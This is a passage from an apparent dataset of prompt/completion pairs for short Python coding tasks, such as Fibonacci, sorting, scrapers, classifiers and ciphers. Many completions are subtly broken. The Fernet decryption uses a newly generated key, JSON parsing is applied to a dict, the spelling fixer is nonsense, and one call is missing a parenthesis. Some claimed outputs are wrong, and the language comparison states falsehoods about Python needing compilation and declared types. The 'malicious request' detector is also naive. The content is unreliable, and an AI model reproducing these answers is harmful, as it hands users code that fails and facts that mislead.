np.linalg.inv(A.T.dot(A)).dot(A.T).dot(b) x_solution, y_solution = solution.item(0), solution.item(1) print(f'x = {x_solution}') print(f'y = {y_solution}') # Output x = 6.0, y = 1.0"},{"prompt":"Write an SQL query that will find all books whose titles contain the word Python. Not applicable","completion":"SELECT * FROM books WHERE title LIKE '%Python%'"},{"prompt":"Build a python program that reads in two strings and combines them into a single string.","completion":"def combine_strings(string1, string2): combined_string = string1 + string2 return combined_string"},{"prompt":"Construct a polynomial regression model in Python that models a given data set.","completion":"# import packages from sklearn.preprocessing import PolynomialFeatures from sklearn.linear_model import LinearRegression # create linear regression object reg = LinearRegression() # create polynomial features poly = PolynomialFeatures(degree = 2) x_poly = poly.fit_transform(X_train) # fit the linear regression model with the polynomial features reg.fit(x_poly, y_train) # predict the y-values using the regression model y_pred = reg.predict(poly.fit_transform(X_test))"},{"prompt":"Create a program in Python that prints out the first 100 Fibonacci numbers.","completion":"a, b = 0, 1 # print the first 100 Fibonacci numbers for i in range(100): print(a, end=' ') a, b = b, a + b"},{"prompt":"Convert a given JSON data into a Python dictionary object. { name: John, age: 32, address: 123 Main Street }","completion":"import json data = { \\"name\\": \\"John\\", \\"age\\": 32, \\"address\\": \\"123 Main Street\\" } py_dict = json.loads(data)"},{"prompt":"Write a Python code to calculate the root mean square error (RMSE) between two given lists of numbers. A = [2.2, 3.07, 3.68, 1.33] B = [1.17, 2.47, 2.57, 0.0]","completion":"def rmse(A, B): \\"\\"\\" Calculates the root mean square error between two given lists of numbers. \\"\\"\\" RMSE = 0 for i,j in zip(A,B): RMSE += (i-j)**2 return (RMSE/len(A))**(1/2) if __name__ == '__main__': A = [2.2, 3.07, 3.68, 1.33] B = [1.17, 2.47, 2.57, 0.0] print(rmse(A, B))"},{"prompt":"Write a Python program that calculates the nth Fibonacci number where n is a positive integer given by the user. 8","completion":"# Fibonacci Sequence def Fibonacci(n): if n<0: print(\\"Incorrect input\\") elif n==1: return 0 elif n==2: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) n = int(input(\\"Enter the value of n: \\")) print(Fibonacci(n))"},{"prompt":"Design a python program which takes a positive integer and returns the prime factorization of that number.","completion":"def prime_factorization(n): prime_numbers = [] i = 2 while i * i <= n: if n % i == 0: prime_numbers.append(i) n = n / i else: i += 1 if n > 1: prime_numbers.append(n) return prime_numbers"},{"prompt":"Using Python, write a program to merge the elements of two arrays into one. arr1=[1, 2, 6, 9, 11] arr2=[2, 3, 4, 7, 8]","completion":"merged_arr = arr1 + arr2 print ( merged_arr ) # [1, 2, 6, 9, 11, 2, 3, 4, 7, 8]"},{"prompt":"Optimize the following code and provide an algorithm to solve it in Python. def fibonacci(n): if n <= 1: return n return fibonacci(n1) + fibonacci(n2)","completion":"def fibonacci(n): # Store the Fibonacci numbers in an array a = [0] * (n + 1) # Base cases a[1] = 1 for i in range(2, n + 1): a[i] = a[i - 1] + a[i - 2] return a[n]"},{"prompt":"Store the provided data into a keyvalue object in Python. first_name: John last_name: Doe age: 28","completion":"person_data = { \\"first_name\\": \\"John\\", \\"last_name\\": \\"Doe\\", \\"age\\": 28 }"},{"prompt":"Develop an algorithm in Python to check if a given string is anagram of another given string.","completion":"def is_anagram(str1, str2): # Get length of both strings n1 = len(str1) n2 = len(str2) # If both strings have different length, then they # are not anagrams if n1 != n2: return 0 # Sort both strings str1 = sorted(str1) str2 = sorted(str2) # Compare sorted strings for i in range(0, n1): if str1[i] != str2[i]: return 0 return 1"},{"prompt":"Create and display a multiplication table of 7 using a Python program.","completion":"#Create and display a multiplication table of 7 #print table header print(' 7 x Table') #print table column header print(' 7 | 14 | 21 | 28 | 35 | 42 | 49 | 56 |') #print table row for num in range(1,10): row_num = 7 * num print(f'{row_num:4} |', end=' ') print()"},{"prompt":"Using Machine Learning algorithms, build a Python program that will classify a given set of handwritten digits. Not applicable","completion":"import numpy as np import matplotlib.pyplot as plt from sklearn import svm, datasets #import data digits = datasets.load_digits() #split data into training and testing sets X_train = digits.data[:-10] y_train = digits.target[:-10] X_test = digits.data[-10:] y_test = digits.target[-10:] #train model clf = svm.SVC(gamma = 0.001, C = 100) clf.fit(X_train, y_train) #evaluate model score = clf.score(X_test, y_test) #predict classes y_pred = clf.predict(X_test) #visualize results plt.imsave(\\"prediction.png\\", digits.images[-10]) print(score) print(y_pred)"},{"prompt":"Optimise a bubble sort algorithm written in Python def bubble_sort(arr): is_sorted = False while not is_sorted: is_sorted = True for i in range(len(arr)1): if arr[i] > arr[i+1]: arr[i],arr[i+1] = arr[i+1],arr[i] is_sorted = False return arr","completion":"def bubble_sort(arr): is_sorted = False n = len(arr) for i in range(n): for j in range(0, n-i-1): if arr[j] > arr[j+1] : arr[j], arr[j+1] = arr[j+1], arr[j] return arr"},{"prompt":"Define a class in Python to represent a person with first name, last name, age, and a method to greet them.","completion":"class Person: def __init__(self, first_name, last_name, age): self.first_name = first_name self.last_name = last_name self.age = age def greet(self): return f\\"Hello, my name is {self.first_name} {self.last_name} and I am {self.age} years old.\\""},{"prompt":"Define a function in Python that takes three numbers as input and return the largest number","completion":"def largestNumber(x, y, z): if x > y and x > z: return x elif y > x and y > z: return y else: return z"},{"prompt":"Write a Python program to sort a dictionary by its keys. d = {'a': 24, 'g': 52, 'c': 13}","completion":"def sort_dict_keys(d): sorted_keys = sorted(d.keys()) sorted_dict = {key: d[key] for key in sorted_keys} return sorted_dict"},{"prompt":"Create a basic search engine using Elasticsearch and Python. The search engine should allow users to enter a query and return a list of relevant documents. Not applicable","completion":"from elasticsearch import Elasticsearch # create the client es = Elasticsearch() # define the query query = { \\"query\\": { \\"match\\": { \\"text\\": \\"query_term\\" } } } # search the index response = es.search(index=\\"index_name\\", body=query) # print the results for hit in response[\\"hits\\"][\\"hits\\"]: print(hit[\\"_source\\"])"},{"prompt":"Create a function in Python that takes a string and a dictionary, and returns a list of all the words in the string that match keys in the dictionary. string = 'This is a string' dictionary = {'This': 'that', 'is': 'not'}","completion":"def get_words(string, dict): words = string.split() output = [] for word in words: if word in dict: output.append(dict[word]) return output output = get_words(string, dictionary) print(output) # ['that', 'not']"},{"prompt":"Create a Python program to encrypt and decrypt strings using a key. Not applicable","completion":"import string def encrypt(plain_text, key): alphabet = list(string.ascii_lowercase) encrypted = \\"\\" for character in plain_text: if character in alphabet: index = alphabet.index(character) + int(key) if index > 25: index -= 26 encrypted += alphabet[index] else: encrypted += character return encrypted def decrypt(encrypted_text, key): alphabet = list(string.ascii_lowercase) decrypted = \\"\\" for character in encrypted_text: if character in alphabet: index = alphabet.index(character) - int(key) if index < 0: index += 26 decrypted += alphabet[index] else: decrypted += character return decrypted # Test print(encrypt(\\"hello world\\", 3)) #khoor zruog print(decrypt(\\"khoor zruog\\", 3)) #hello world"},{"prompt":"Generate a Django project named myproject with the following structure:","completion":"django-admin startproject myproject cd myproject python manage.py startapp main"},{"prompt":"Create a function in Python that receives a word as input, searches for synonyms in a dictionary and returns a list of synonyms. word = happy","completion":"import json def get_synonyms(word): synonyms = [] with open('dictionary.json') as dictionary_file: dictionary = json.load(dictionary_file) if word in dictionary.keys(): for syn in dictionary[word]: synonyms.append(syn) return synonyms print(get_synonyms('happy'))"},{"prompt":"Optimize this Python code to count the number of occurrences of an element in an array. [2, 3, 3, 10, 12]","completion":"def countOccurrences(arr, x): count = 0 n = len(arr) for i in range(0, n): if (x == arr[i]): count = count + 1 return count # Driver code arr = [2, 3, 3, 10, 12] x = 3 assert countOccurrences(arr, x) == 2"},{"prompt":"Compare and contrast the features of the two languages, JavaScript and Python.","completion":"There are several key differences between JavaScript and Python. JavaScript is primarily a client-side scripting language, while Python is predominantly a server-side scripting language. JavaScript is an interpreted language which means that it does not need to be compiled before running, whereas Python needs to be compiled before it can run. JavaScript is a loosely typed language and allows for variables to have different data types, whereas Python is a strongly typed language and variables have to be given a specific data type. JavaScript can be used to create dynamic webpages with interactive content, while Python is optimized to work with packages and modules, making it a better choice for complex tasks and data analysis."},{"prompt":"Consider a way to detect malicious HTTP requests using Python.","completion":"\\"\\"\\" Detect malicious HTTP requests using Python \\"\\"\\" import requests from urllib.parse import urlparse import re def detect_malicious_requests(url): # Parse the URL parsed_url = urlparse(url) # Check for malicious URL patterns malicious_patterns = [ r\\".exe\\", r\\".js\\", r\\".gz\\", r\\".bat\\", r\\".zip\\", r\\".php\\", r\\".sh\\", r\\".json\\" ] for pattern in malicious_patterns: if re.search(pattern, parsed_url.path): return \\"MALICIOUS\\" # Check for suspicious file extensions suspicious_file_extensions = [ \\".xml\\", \\".config\\", \\".log\\", \\".ini\\" ] for extension in suspicious_file_extensions: if parsed_url.path.endswith(extension): return \\"SUSPICIOUS\\" # Check for HTTP status codes response = requests.get(url) if response.status_code == 401: return \\"MALICIOUS\\" return \\"SAFE\\" if __name__ == '__main__': url = \\"http://example.com/index.php\\" print(detect_malicious_requests(url))"},{"prompt":"Write a Python program to identify if the number provided is an Armstrong number or not. Number: 1634","completion":"def isArmstrongNumber(num): order = len(str(num)) result = 0 # calculate the sum of nth power of every digit temp = num while(temp > 0): digit = temp % 10 result += digit ** order temp //= 10 # check if sum is equal to the given num if (result == num): return True else: return False num = int(input(\\"Enter a number: \\")) if (isArmstrongNumber(num)): print(num, \\"is an Armstrong number\\") else: print(num, \\"is not an Armstrong number\\")"},{"prompt":"Create a Python function that takes a string as an input and returns the substring between the first and the last character. thequickbrownfox","completion":"def get_substring(string): return string[1:-1]"},{"prompt":"Create a Python module that can encrypt and decrypt strings. Not applicable","completion":"from cryptography.fernet import Fernet def encrpyt_string(text): key = Fernet.generate_key() cipher_suite = Fernet(key) token = cipher_suite.encrypt(text.encode()) return token def decrpyt_string(token): key = Fernet.generate_key() cipher_suite = Fernet(key) plain_text = cipher_suite.decrypt(token) return plain_text"},{"prompt":"Generate a python program to determine if two objects are mutually exclusive or not. Input objects are ([1,2,3], [4,5,6]).","completion":"def mutually_exclusive(object1, object2): if len(object1.intersection(object2)) > 0: return False else: return True object1 = set([1, 2, 3]) object2 = set([4, 5, 6]) result = mutually_exclusive(object1, object2) print(result) # Outputs True as objects don't share elements."},{"prompt":"Write a Python class to implement the Binary Search Tree structure.","completion":"class Node: def __init__ (self, data): self.data = data self.left = None self.right = None class BinarySearchTree: def __init__ (self): self.root = None def insert (self, data): if self.root == None: self.root = Node(data) else: self._insert(data, self.root) def _insert(self, data, cur_node): if data < cur_node.data: if cur_node.left == None: cur_node.left = Node(data) else: self._insert(data, cur_node.left) elif data > cur_node.data: if cur_node.right == None: cur_node.right = Node(data) else: self._insert(data, cur_node.right) else: print(\\"Value already in tree\\")"},{"prompt":"Create a method in Python to flatten a 2Dimentional array. array = [[1, 2], [3, 4], [5, 6]]","completion":"def flatten(arr): flat_list = [] for sublist in arr: for item in sublist: flat_list.append(item) return flat_list flatten(array)"},{"prompt":"You are given a list of data that you need to analyze and come up with visual output. Create a python code that clean the data and generate a visual representation. data = [10, 20, 30, 40, 50]","completion":"import pandas as pd import matplotlib.pyplot as plt # Clean data data_df = pd.DataFrame(data) # Visual representation plt.figure(figsize=(5,5)) plt.bar(data_df.index, data_df[0]) plt.xticks(data_df.index) plt.xlabel('Index') plt.ylabel('Value') plt.title('Visual Representation of Data') plt.show()"},{"prompt":"python, write a function that takes in two numbers and returns the sum of their digits.","completion":"def sum_digits(a,b): #convert each number to string a = str(a) b = str(b) #initialize sum sum = 0 for i in range(len(a)): sum += int(a[i]) for i in range(len(b)): sum += int(b[i]) #return sum return sum"},{"prompt":"Write a Python function that given a list of strings and an integer n, returns the strings that have a length greater than n. ['Cat', 'Dog', 'Rabbit', 'Elephant'], n = 5","completion":"def filter_strings(strings, n): return [s for s in strings if len(s) > n]"},{"prompt":"Develop a textbased game in Python where you explore a cave and collect coins. Not applicable","completion":"import random # constants CELLS = [(0, 0), (0, 1), (0, 2), (1, 0), (1, 1), (1, 2), (2, 0), (2, 1), (2, 2)] def get_locations(): # monster = random location monster = random.choice(CELLS) # player = random location player = random.choice(CELLS) # if monster and player are in the same location, regenerate if monster == player: return get_locations() # door = random location door = random.choice(CELLS) # if monster, player or door are in the same location, regenerate if monster == door or player == door: return get_locations() return monster, player, door def move_player(player, move): # get the player's current location x, y = player # if move is LEFT, y - 1 if move == 'LEFT': y -= 1 # if move is RIGHT, y + 1 elif move == 'RIGHT': y += 1 # if move is UP, x - 1 elif move == 'UP': x -= 1 # if move is DOWN, x + 1 elif move == 'DOWN': x += 1 # if the player moves beyond a boundary, they stay in the same place if x < 0: x = 0 elif x > 2: x = 2 elif y < 0: y = 0 elif y > 2: y = 2 return x, y def get_moves(player): moves = [\\"LEFT\\", \\"RIGHT\\", \\"UP\\", \\"DOWN\\"] x, y = player # if monster is one the left side, they can't move left if x == 0: moves.remove(\\"LEFT\\") # if monster is one the right side, they can't move right if x == 2: moves.remove(\\"RIGHT\\") # if monster is one the top side, they can't move up if y == 0: moves.remove(\\"UP\\") # if monster is one the bottom side, they can't move down if y == 2: moves.remove(\\"DOWN\\") return moves def draw_map(player): print(\\" _ _ _\\") tile = \\"|{}\\" for idx, cell in enumerate(CELLS): if idx in [0, 1, 3, 4, 6, 7]: if cell == player: print(tile.format(\\"X\\"), end=\\"\\") else: print(tile.format(\\"_\\"), end=\\"\\") else: if cell == player: print(tile.format(\\"X|\\")) else: print(tile.format(\\"_|\\")) monster, player, door = get_locations() print(\\"Welcome to the dungeon!\\") while True: moves = get_moves(player) print(\\"You're currently in room {}\\".format(player)) draw_map(player) print(\\"you can move {}\\".format(moves)) # Fill in with available moves print(\\"Enter QUIT to quit\\") # GET PLAYER'S MOVE move = input(\\"> \\").upper() # if move is a valid, move player if move in moves: player = move_player(player, move) # if move isquit, quit if move == 'QUIT': break # if monster is player's location, end game if player == monster: print(\\"nOH NO! The monster got you...n\\") break # if player is at the door, they win if player == door: print(\\"nYou escaped! Congratulations!n\\") break"},{"prompt":"Construct a linear regression model in Python to predict the output of a dataset.","completion":"import pandas as pd import numpy as np from sklearn.linear_model import LinearRegression # Load the dataset df = pd.read_csv('dataset.csv') # Extract input and output features X = df[df.columns[:-1]].values y = df[df.columns[-1]].values # Create and fit the model model = LinearRegression().fit(X, y) # Output the model coefficients print('Intercept:', model.intercept_) for i, col in enumerate(df.columns[:-1]): print(f'Coefficient of {col} : {model.coef_[i]}')"},{"prompt":"Develop a software system to automate an law office workflow.","completion":"# Create Python scripts to automate law office workflow # Import libraries import pandas as pd import datetime # Create dataframe to hold initial project details df = pd.DataFrame(columns=[\\"Task Name\\", \\"Due Date\\", \\"Assigned To\\"]) # Create functions to store and retrieve workflow data def store_data(name, due_date, assigned_to): df.loc[len(df)] = ([name, due_date, assigned_to]) # Store data in a CSV file df.to_csv(\\"law_office_workflow.csv\\") def retrieve_data(): data = pd.read_csv(\\"law_office_workflow.csv\\") return data # Set variables to store user input input_name = input(\\"What is the task name? \\") input_duedate = input(\\"What is the due date? \\") input_assignee = input(\\"Who is the assignee? \\") # Store user input data store_data(input_name, input_duedate, input_assignee) # Use the retrieve_data() function to get the stored data my_data = retrieve_data() # Print the stored data print(my_data)"},{"prompt":"Create a Python Class to handle JSON formatted data","completion":"import json class JSONHandler(): '''A class to handle JSON-formatted data''' def __init__(self, json_string): self.json_string = json_string self.data = self.__parse_json_data() def __parse_json_data(self): parsed_data = json.loads(self.json_string) return parsed_data def get_data(self): return self.data def set_data(self, new_data): self.data = new_data self.__update_json_data() def __update_json_data(self): self.json_string = json.dumps(self.data)"},{"prompt":"Create a Python script that performs sentiment analysis on a given text. The script should receive text as an input, and return a score (between 0 and 1) that indicates the sentiment of the text. The food here is terrible and the service is even worse.","completion":"import nltk from nltk.sentiment.vader import SentimentIntensityAnalyzer sentiment_analyzer = SentimentIntensityAnalyzer() sentence = \\"The food here is terrible and the service is even worse.\\" scores = sentiment_analyzer.polarity_scores(sentence) print(\\"Sentiment Score: %s\\" % scores['compound']) # output: -0.8345"},{"prompt":"Generate a function in Python for finding the maximum value in a list of numbers with time complexity O(n). num_list = [3, 7, 4, 2, 8, 16, 1, 9, 10]","completion":"def max_val(num_list): if len(num_list) == 0: return None max_num = num_list[0] for num in num_list: if num > max_num: max_num = num return max_num"},{"prompt":"Write a Python program to divide a list of numbers into two equal lists. [1,2,3,4,5,6,7,8,9,10]","completion":"list_a = [1,2,3,4,5] list_b = [6,7,8,9,10]"},{"prompt":"Write a Python program to remove the characters which have odd index values of a given string. Hello World","completion":"def remove_odd_index_characters(string): result = \\"\\" for i in range(len(string)): if i % 2 == 0: result += string[i] return result print(remove_odd_index_characters(\\"Hello World\\"))"},{"prompt":"Create a Python program to encode a string with a Caesar cipher. plaintext = Caesar Cipher shift = 3","completion":"def caesar_cipher(plaintext,shift): ciphertext = \\"\\" for char in plaintext: if char == ' ': ciphertext += char elif char.isupper(): ciphertext += chr((ord(char) + shift - 65) % 26 + 65) else: ciphertext += chr((ord(char) + shift - 97) % 26 + 97) return ciphertext plaintext = \\"Caesar Cipher\\" shift = 3 ciphertext = caesar_cipher(plaintext,shift) print(\\"Plain Text : {}\\".format(plaintext)) print(\\"Cipher Text : {}\\".format(ciphertext))"},{"prompt":"Translate the following Java code to Python for (int i = 0; i < n; i++) System.out.println(Hello World);","completion":"for i in range(n): print(\\"Hello World\\")"},{"prompt":"Write a Python program to retrieve the name of the user from a given input. User ID: uchefu","completion":"ID = input('User ID: ') user_name = ID.split('che')[0] print('User Name: ' + user_name)"},{"prompt":"Create a Python program to format a string of text using basic punctuation rules. This is a string of tex","completion":"def punctuate(text): text = text.strip() if not text.endswith('.'): text += '.' if not text.startswith(tuple('ABCDEFGHIJKLMNOPQRSTUVWXYZ')): text = text[0].upper() + text[1:] for char in ['!', '?', ':', ';', ',', '\\"']: if char in text: text = text[:-1] + char + ' ' return text punctuate('this is a string of text') # Output: 'This is a string of text.'"},{"prompt":"Generate a function to return the all the vowels from a string in Python. Not applicable","completion":"def get_vowels(string): vowels = 'aeiou' return [char for char in string if char in vowels]"},{"prompt":"Develop a Python script to print all possible words with a given set of letters. letters = ('a', 'c', 'd', 'e', 'm')","completion":"import itertools letters = ('a', 'c', 'd', 'e', 'm') for words in itertools.permutations(letters): print(''.join(words))"},{"prompt":"Write a procedure in Python to rectify misspelled words in a paragraph. My favarite flowers are rose and tulples","completion":"import re def fix_spelling(paragraph): words = paragraph.split() corrected_words = [] for word in words: corrected_words.append(re.sub(r'[aeiou]',r'[aeiou]', word)) return \\" \\".join(corrected_words) print(fix_spelling(\\"My favarite flowers are rose and tulples\\"))"},{"prompt":"Compose a function in Python to take two numbers as input and return the greatest number. 5 and 8","completion":"def getGreatestNumber(a, b): if a > b: return a return b greatest_num = getGreatestNumber(5, 8) print(\\"Greatest number is\\", greatest_num)"},{"prompt":"Create a method in Python that accepts two strings and returns a boolean if the two strings are anagrams. “listen” and “silent”","completion":"def is_anagram(string1, string2): return (sorted(string1) == sorted(string2)) print(is_anagram(\\"listen\\", \\"silent\\")) # prints True"},{"prompt":"Create a Python program for visualizing a given dataset using matplotlib. x = [1, 2, 3, 4, 5] y = [1, 4, 9, 16, 25]","completion":"import matplotlib.pyplot as plt x = [1, 2, 3, 4, 5] y = [1, 4, 9, 16, 25] # plotting the points plt.plot(x, y) # naming the x axis plt.xlabel('x - axis') # naming the y axis plt.ylabel('y - axis') # giving a title to my graph plt.title('My first graph!') # function to show the plot plt.show()"},{"prompt":"Design a graphical user interface using Python's tkinter library.","completion":"# Imports import tkinter as tk # Setting up the window window = tk.Tk() window.title(\\"My GUI\\") # Adding components label1 = tk.Label(window, text=\\"Hello World\\") label1.pack() # Running the program window.mainloop()"},{"prompt":"Create a webhook in Python to handle incoming HTTP POST requests. This webhook should process the JSON payload in the POST request and log the output to console. { name: John Doe, email: john@example.com }","completion":"import json from flask import Flask, request app = Flask(name) @app.route('/webhook', methods=['POST']) def webhook(): payload = json.loads(request.data) print(payload) return \\"OK\\" if name == 'main': app.run(debug=True)"},{"prompt":"Generate a Python program to print out all possible permutation of a given list of elements. [1, 2, 3]","completion":"def permutations(input_list): if len(input_list) == 1: return input_list output_list = [] for value in input_list: temp_list = input_list[:] temp_list.remove(value) permutations_list = permutations(temp_list) for sub_list in permutations_list: output_list.append([value] + sub_list) return output_list"},{"prompt":"Create a Python program that uses recursive functions to search through a list of integers and find pairs whose sum equals a given number. List of integers: [2, 4, 3, 5, 7, 8] Given number: 7","completion":"def search(nums, target): foundPairs = set() def helper(i, j): if i >= j: return s = nums[i] + nums[j] if s == target: foundPairs.add((nums[i], nums[j])) if s >= target: helper(i, j-1) else: helper(i+1, j) helper(0, len(nums)-1) return foundPairs lst = [2, 4, 3, 5, 7, 8] target = 7 print(search(lst, target)) # Output: {(3,4), (2,5)}"},{"prompt":"Write a Python function for computing the Fibonacci numbers of n.","completion":"def fibonacci(n): if n < 2: return n return fibonacci(n - 1) + fibonacci(n - 2)"},{"prompt":"Create a function in Python that takes in a list and sorts it in ascending order. [3, 5, 1, 2, 9]","completion":"def sortList(list): list.sort() return list print(sortList([3, 5, 1, 2, 9])) # Output: [1, 2, 3, 5, 9]"},{"prompt":"Create a Python program to calculate the sum of natural numbers below a certain number. n=100","completion":"def sumNaturalNumbers(n): sum = 0 for i in range(1, n+1): sum+=i return sum print(sumNaturalNumbers(100))"},{"prompt":"Write a Python program that will determine the maximum number of unique paths a person can take from one point to another in a twodimensional grid. grid = [ [0,1], [1,1] ]","completion":"def unique_paths(grid): rows = len(grid) cols = len(grid[0]) dp = [[0 for i in range(cols)] for j in range(rows)] for i in range(rows): for j in range(cols): if i == 0 or j == 0: dp[i][j] = 1 else: dp[i][j] = dp[i][j-1] + dp[i-1][j] return dp[-1][-1] print(unique_paths(grid)) # Output: 2"},{"prompt":"Create a web service to automatically summarize text using the TextRank algorithm. Not Applicable","completion":"# Importing the necessary libraries import nltk import summarizer # Function to automatically summarize text using the TextRank algorithm def summarize_text(text): # Tokenizing the text sentences = nltk.sent_tokenize(text) # Generating the summary summary = summarizer.summarize(sentences, ratio=0.2) # Returning the summary return summary # Testing the summarize_text function text = \\"Python is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991, Python is today used by millions of people all over the world. Python was designed to be highly readable and accessible. Its syntax makes it easy to learn and use.\\" summary = summarize_text(text) print(summary)"},{"prompt":"Design a class in Python that takes two numbers as parameters and returns a multiplication of them.","completion":"class Multiplication: def __init__(self, num1, num2): self.num1 = num1 self.num2 = num2 def multiply(self): return self.num1 * self.num2"},{"prompt":"Generate a program in Python to print the union of two given sets. [1, 2, 3], [2, 3, 4, 5]","completion":"def union_sets(set1, set2): return list(set(set1) | set(set2)) set1 = [1, 2, 3] set2 = [2, 3, 4, 5] print(union_sets(set1, set2)"},{"prompt":"Create a Python program to print out the lyrics of the song Happy Birthday. Not applicable","completion":"print(\\"Happy birthday to you\\") print(\\"Happy birthday to you\\") print(\\"Happy birthday dear ____\\") print(\\"Happy birthday to you\\")"},{"prompt":"Write a Python program to generate a unique random password with at least one lowercase letter, one uppercase letter, one digit and one special character.","completion":"import random lower_chars = \\"abcdefghijklmnopqrstuvwxyz\\" upper_chars = lower_chars.upper() digits = \\"0123456789\\" special_chars = \\"!@#%^&*()\\" def generate_password(length): password = \\"\\" password += random.choice(lower_chars) password += random.choice(upper_chars) password += random.choice(digits) password += random.choice(special_chars) for i in range(length - 4): password += random.choice(lower_chars + upper_chars + digits + special_chars) return password if __name__ == '__main__': print(generate_password(10)) # Output V1!sQUn4f4"},{"prompt":"Create a web scraper in Python that can extract product names and prices from an ecommerce website. Not applicable","completion":"import requests from bs4 import BeautifulSoup url = \\"example.com\\" # Make a GET request to fetch the raw HTML content html_content = requests.get(url).text # Parse the html content soup = BeautifulSoup(html_content, \\"lxml\\") # print(soup.prettify()) # print the parsed data of html # Get Product Name products = soup.find_all(\\"div\\", attrs={\\"class\\": \\"product-name\\"}) for product in products: product_name = product.find('a').text print(\\"Product Name:\\", product_name) # Get Product Price prices = soup.find_all(\\"span\\", attrs={\\"class\\": \\"price\\"}) for price in prices: product_price = price.text print(\\"Product Price:\\", product_price)"},{"prompt":"Refactor the following Python code to improve its readability and make it easier to maintain: images = list() for item in allitems: if item.endswith('.jpg'): images.append(item)","completion":"images = [item for item in allitems if item.endswith('.jpg')]"},{"prompt":"Create a Python lambda expression that prints out the square of each item in an input list. [1, 2, 3]","completion":"square = lambda nums: [x*x for x in nums] squares = square([1,2,3]) print(squares)"},{"prompt":"Create a web scraper in Python which finds the maximum and minimum temperatures in the US.","completion":"# import libraries import requests from bs4 import BeautifulSoup import pandas as pd # set the url to scrape url = \\"https://www.weather.gov/source/crh/stateMaxMinTemps.php\\" # make a request to the url and create the beautiful soup object response = requests.get(url) soup = BeautifulSoup(response.text, \\"html.parser\\") # parse the table table = soup.find(id=\\"main\\") # read the table in to a DataFrame df = pd.read_html(str(table))[0] # rename the columns df.columns=['state', 'max_temp', 'min_temp'] # find the maximum and minimum temperatures max_temp = df['max_temp'].max() min_temp = df['min_temp'].min() # print the maximum and minimum temperatures print('The maximum temperature in the US is: %s' % max_temp) print('The minimum temperature in the US is: %s' % min_temp)"},{"prompt":"Generate a Python code that can parse a JSON string and convert it to a Python dictionary. json_string = {'name': 'John', 'age': 25, 'hobbies': ['soccer', 'running']}","completion":"import json def parse_json_string(json_string): \\"\\"\\" Parses a JSON string and converts it to a Python dictionary. :param json_string: The JSON string to parse :type json_string: str :return: A Python dictionary parsed from the JSON string :rtype: dict \\"\\"\\" return json.loads(json_string)"},{"prompt":"Develop an API in Python to convert between different units of measurement. Not applicable","completion":"# Dictionary with conversion factors FACTORS = { 'in': 2.54, 'cm': 0.39, 'ft': 30.48, 'm': 1 } def convert(from_unit, to_unit, value): \\"\\"\\" Convert between measurement units. \\"\\"\\" factor = FACTORS[from_unit]/FACTORS[to_unit] return factor * value # Test the function print(convert('in', 'cm', 10)) # Output: 25.4 print(convert('ft', 'm', 15)) # Output: 4.572"},{"prompt":"Write a Python program to edit a given string and remove all occurances of the. string = the quick brown fox jumped over the lazy dog","completion":"def remove_the(string): edited_string = string.replace(\\"the\\", \\"\\") return edited_string result = remove_the(\\"the quick brown fox jumped over the lazy dog\\") print(result)"},{"prompt":"Create a Python program to identify whether a number is prime or not. 15","completion":"def is_prime(num): if num > 1: for n in range(2, num): if (num % n) == 0: return False return True else: return False num = int(input(\\"Enter a number: \\")) if is_prime(num): print(num, \\"is a Prime number\\") else: print(num, \\"is not a Prime number\\")"},{"prompt":"Write a Python function that takes two input strings and returns TRUE if the second string is a rotation of the first one (e.g., 'hello' and 'lohel' should return true). hello, lohel","completion":"def is_rotation(str1, str2): return len(str1) == len(str2) and str2 in str1 + str1 # testing print(is_rotation('hello', 'lohel')) # prints True"},{"prompt":"Provide a function in Python for squaring all elements of a given array. list = [1, 2, 3, 4]","completion":"def square_elements(arr): return [num**2 for num in arr]"},{"prompt":"Design a program in Python to reverse the words of a given string. String s = This is an example sentence.","completion":"def reverseWords(s): # split the string words = s.split(' ') # reverse the words words = words[::-1] # join the words reverseString = ' '.join(words) return reverseString s = \\"This is an example sentence.\\" print(reverseWords(s)) # Output: sentence. example an is This"},{"prompt":"Create a program to encrypt a string using matrix transposition in Python. string = AESTHETICISMISTHEFINESTART","completion":"def encryptMatrixTranspose(string): matrix = [list(string[i:i+6]) for i in range(0, len(string), 6)] for row in matrix: if(len(row) != 6): for i in range(len(row), 6): row.append(\\"_\\") new_matrix = [] for i in range(6): new_row = [] for row in matrix: new_row.append(row[i]) new_matrix.append(new_row) return ''.join([''.join(row) for row in new_matrix]) string = \\"AESTHETICISMISTHEFINESTART\\" encrypted = encryptMatrixTranspose(string) print(encrypted)"},{"prompt":"Create a Python script that automates the process of filling out a web form. Not applicable","completion":"import requests url = 'https://example.com' # Set the form data data = { 'field1': 'value1', 'field2': 'value2', 'field3': 'value3', 'field4': 'value4' } # Send a POST request to the URL with the form data r = requests.post(url, data=data) # Check the response code if r.status_code == 200: print('Form submitted successfully.') else: print('Error submitting form.')"},{"prompt":"Create a basic sentence classifer in Python using NLP. The classifier should be able to classify whether a sentence is about science, technology, or sports. science and technology has revolutionized how we live","completion":"import nltk from nltk import word_tokenize from nltk.corpus import stopwords import sklearn from sklearn.svm import SVC # Pre-process input for the classifier def pre_process(sentence): stopwords_list = stopwords.words('english') tokens = word_tokenize(sentence) lower_tokens = [token.lower() for token in tokens if token not in stopwords_list] return lower_tokens # Create feature set using bag of words def create_feature_set(sentence_list): feature_set = [] for item in sentence_list: feature_set.extend([pre_process(item['sentence'])]) return feature_set # Train the classifier def train_classifier(sentence_list): feature_set = create_feature_set(sentence_list) targets = [item['category'] for item in sentence_list] svc = SVC(kernel='linear').fit(feature_set, targets) return svc # Test the classifier def test_classifier(classifier, sentence): feature_set = pre_process(sentence) prediction = classifier.predict([feature_set]) return prediction[0] # Train the classifier sentence_list = [ {'sentence': 'I like playing football', 'category': 'sports'}, {'sentence': 'I like reading books', 'category': 'science'}, {'sentence': 'Data science is an interesting field', 'category': 'technology'} ] classifier = train_classifier(sentence_list) # Predict the sentence sentence = 'science and technology has revolutionized how we live' prediction = test_classifier(classifier, sentence) print('Prediction:', prediction) #technology"},{"prompt":"Create a Python machine learning model that takes data points of the form (x, y), where x is an integer in the range [1,10] and y is an integer in the range [1,100]. The model should predict whether the value of y given x is even or odd. Not applicable","completion":"import numpy as np from sklearn.linear_model import LogisticRegression # Generate data points X = [] y = [] for i in range(1, 11): for j in range(1, 101): X.append([i, j]) if j % 2 == 0: y.append(1) else: y.append(0) # Train the model X_data = np.array(X) y_data = np.array(y) model = LogisticRegression() model.fit(X_data, y_data)"},{"prompt":"Write a Python program to optimize a bank’s loan portfolio. The program should include a function that updates a portfolio’s weights according to a given risk/return ratio. 